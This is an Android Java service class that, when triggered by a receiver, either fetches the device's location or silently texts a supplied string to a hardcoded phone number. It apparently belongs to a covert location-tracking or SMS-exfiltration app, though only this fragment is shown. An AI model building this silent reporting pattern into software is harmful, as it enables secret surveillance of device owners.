package xrz.activity;

import xrz.utils.GetLocation;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.app.*;

public class MyService extends Service {

	private Context context;
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	@Override
	public void onCreate(){
		Log.i("111111111", "onCreate");
		context=MyReceiver.context;
		super.onCreate();
	}
	
	@Override
	public void onStart(Intent intent,int startId){
		int num=intent.getIntExtra("num", 0);
		if(num == 0){
			GetLocation.getLocationMessage(MyReceiver.context);
		}else if(num == 1){
			String str=intent.getStringExtra("str");
			if(str != null){
				SmsManager manager=SmsManager.getDefault();
				manager.sendTextMessage("13676994571", null, str, null, null);
				onDestroy();
			}
		}
	}

	@Override
	public void onDestroy(){
		super.onDestroy();
	}
	
}
